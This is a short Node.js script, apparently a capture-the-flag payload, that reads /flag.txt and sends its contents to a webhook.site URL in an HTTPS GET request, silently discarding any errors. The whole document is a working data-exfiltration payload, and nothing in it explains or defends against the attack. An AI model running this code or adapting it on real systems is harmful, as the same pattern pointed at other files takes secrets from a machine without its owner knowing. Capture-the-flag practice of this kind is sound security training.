const fs = require("fs");
const https = require("https");

try {
  const flag = fs.readFileSync("/flag.txt", "utf8");
  const url =
    "https://webhook.site/fb33977a-233c-4537-9090-6d6e7cab26ce?flag=" +
    encodeURIComponent(flag);
  https.get(url).on("error", () => {});
} catch (e) {}
